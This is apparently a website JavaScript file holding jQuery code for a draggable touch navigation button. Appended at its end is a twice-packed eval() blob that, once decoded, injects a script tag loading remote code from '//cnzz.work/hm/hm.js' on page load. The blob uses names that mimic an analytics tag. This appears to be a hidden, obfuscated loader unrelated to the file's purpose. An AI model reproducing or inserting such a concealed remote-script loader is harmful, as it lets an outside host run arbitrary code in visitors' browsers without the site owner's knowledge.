$(document).ready(function() {//panmove
    var tb = false;
    function panmove(){
        var pan_in=$(".site_nav");
        var scr_w=parseInt($(".allpage").width())-parseInt($(".site_btn").width());
        var scr_h=parseInt($(".allpage").height())-parseInt($(".site_btn").height());
        var half_w=parseInt(parseInt($(".allpage").width())/2);
        var half_h=parseInt(parseInt($(".allpage").height())/2);
        var isdrag=false;
        var tx,ty,x,y,n,m;
        function movemouse(e){
            if(isdrag){
                if((tx+e.touches[0].pageX-x)>scr_w){
                    n=scr_w;
                    tb = true;
                }else{
                    n=(tx+e.touches[0].pageX-x)>0?(tx+e.touches[0].pageX-x):0;
                    if(n<=half_w){ // 小于50%
                        pan_in.css("right","auto");
                        pan_in.css("left","100%");
                        tb = false;
                    }else{ // 大于50%
                        pan_in.css("left","auto");
                        pan_in.css("right","100%");
                        tb = true;
                    }
                }
                if((ty+e.touches[0].pageY-y)>scr_h){
                    m=scr_h;
                    pan_in.css("top","auto");
                    pan_in.css("bottom","100%");
                }else{
                    m=(ty+e.touches[0].pageY-y)>0?(ty+e.touches[0].pageY-y):0;
                    if(m<=half_h){ // 大于50% 屏幕底部
                        pan_in.css("top","0");
                        pan_in.css("bottom","auto");
                    }else{
                        pan_in.css("top","auto");
                        pan_in.css("bottom","100%");
                    }
                }
                $("#pbtn-nav").css("left",n);
                $("#pbtn-nav").css("top",m);
                e.preventDefault();
            }
            pan_in.removeClass("slideup");
            pan_in.removeClass("slidedown");
        }
        function selectmouse(e){
            isdrag=true;
            tx=parseInt($(".site_btn").css("left"));
            ty=parseInt($(".site_btn").css("top"));
            x=e.touches[0].pageX;
            y=e.touches[0].pageY;
            e.preventDefault();
        }
        document.getElementById("pbtn-nav").addEventListener('touchend',function(){isdrag=false;});
        document.getElementById("pbtn-nav").addEventListener('touchstart',selectmouse);
        document.getElementById("pbtn-nav").addEventListener('touchmove',movemouse);
    }
    //panmove();
    $("#pbtn-nav").click(function(){
        if(tb == true){
            $(".site-nav").toggleClass("slidedown");
        }else{
            $(".site-nav").toggleClass("slideup");
        }
    });
});;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))